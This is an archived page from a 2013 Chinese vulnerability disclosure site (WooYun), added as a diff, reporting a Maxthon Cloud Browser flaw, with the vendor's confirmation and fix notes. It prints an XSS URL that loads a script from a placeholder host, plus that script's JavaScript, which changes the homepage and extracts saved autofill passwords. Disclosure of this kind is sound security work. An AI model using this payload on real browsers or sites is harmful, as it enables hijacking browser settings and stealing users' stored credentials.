@@ -1,0 +1,214 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		傲游云浏览器漏洞造成可以远程控制浏览器  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		傲游云浏览器漏洞造成可以远程控制浏览器  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的胖子">心伤的胖子</a> 
+</li><li>提交时间：		2013-08-03 08:21</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-03：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-08-05：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-08-08：	细节向第三方安全合作伙伴开放<br/>
+									2013-08-15：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-08-25：	细节向普通白帽子公开<br/>
+									2013-09-14：	细节向实习白帽子公开<br/>
+									2013-11-01：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">傲游云浏览器漏洞造成可以远程修改浏览器的设计，以及获取浏览器的数据，达到控制浏览器的目的。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">测试版本：v4.1.0.4000<br />
+<br />
+傲游浏览器设置功能是通过 html 代码实现的，通过查看页面属性为：mx://res/options/index.htm，获取设置操作相关的代码就有机会控制浏览器。<br />
+<br />
+查看源代码发现相关的 js 代码都在下面两个文件中：<br />
+<br />
+mx://res/base/js/ext/mx.config.js<br />
+<br />
+mx://res/options/js/all.js<br />
+<br />
+对 js 代码分析发现所有的操作都在 maxthon 这个对象里面，在控制台里面查看下，如下图（对于文件操作、命令执行等高危函数不知道是做了限制还是给去掉了？）：<br />
+<br />
+</p><p class="detail"><a href="../images/03001403172e0913e0ee5aa812f16dbde29e44e1.png" target="_blank"><img src="../images/03001403172e0913e0ee5aa812f16dbde29e44e1.png" alt="mx1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+结合 all.js 中的内容就可以写出修改浏览器设置的代码，以及获取浏览器历史纪录、自动表单填充中的密码等，但是要想完全控制浏览器就需要想办法让浏览器执行我们的代码，可以直接在其他域下放入相关代码是不行的，权限不够。如果 maxthon.cn 域是不是有权限呢，经过测试是可以的，如下图：<br />
+<br />
+</p><p class="detail"><a href="../images/03001425fca116474dfbca17514a9a09c34bb9e7.png" target="_blank"><img src="../images/03001425fca116474dfbca17514a9a09c34bb9e7.png" alt="mx2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/03001444d351ec7ea9ad0e4c0018be92eccee97a.png" target="_blank"><img src="../images/03001444d351ec7ea9ad0e4c0018be92eccee97a.png" alt="mx3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+那只要在 maxthon.cn 任意一个域下找个 xss 就可以了，那么来了：<br />
+<br />
+http://mm.maxthon.cn/feedback/feedback-list.php?deviceid=xxx&amp;lang=x&quot;&gt;&lt;script src=http://www.a.com/mx.js?&gt;&lt;/script&gt;<br />
+<br />
+PS：貌似国内好多做浏览器的都没有考虑 xss 过滤器<br />
+<br />
+http://www.a.com/mx.js 的代码为：<br />
+<br />
+</p><pre><code>//修改主页<br />
+function bK(w, bR) {<br />
+    maxthon.browser.config.ConfigManager.set(&quot;maxthon.config&quot;, w, bR);<br />
+}<br />
+bK(&quot;browser.general.startpage&quot;,&quot;http://www.baidu.com/&quot;);<br />
+<br />
+//获取自动表单填充用户密码<br />
+var str = &quot;&quot;;<br />
+var forms = eval(&quot;(function(){return &quot; + maxthon.browser.MagicFillService.getSavedPasswords() + &quot;;})()&quot;);<br />
+for(form in forms){<br />
+    str = &quot;url: &quot; + forms[form][&quot;form&quot;][&quot;origin&quot;] + &quot; | user: &quot; + forms[form][&quot;form&quot;][&quot;user_name_value&quot;] + &quot; | passwd: &quot; + maxthon.browser.MagicFillService.showSavedPassword(forms[form][&quot;form&quot;][&quot;password_value&quot;]) + &quot;\n&quot; + str;<br />
+}<br />
+alert(str);</code></pre><p class='detail'><br />
+<br />
+如下图：<br />
+<br />
+</p><p class="detail"><a href="../images/030015231cc6361a98fec48ec6069249fd89f964.png" target="_blank"><img src="../images/030015231cc6361a98fec48ec6069249fd89f964.png" alt="mx4.png" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">如下图：<br />
+<br />
+</p><p class="detail"><a href="../images/030015231cc6361a98fec48ec6069249fd89f964.png" target="_blank"><img src="../images/030015231cc6361a98fec48ec6069249fd89f964.png" alt="mx4.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1、*.maxthon.cn 只要有 xss 就可以，可是怎么修的完？<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的胖子" title="心伤的胖子">心伤的胖子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-033365" title="傲游云浏览器漏洞造成可以远程控制浏览器">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-08-05 07:50</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢报告, 正在调整策略.</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-08-13：站点已调整权限. 客户端部分修复.</p>
+												<p class="detail">2013-09-06：已修复. 谢谢帮助.</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="33365";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
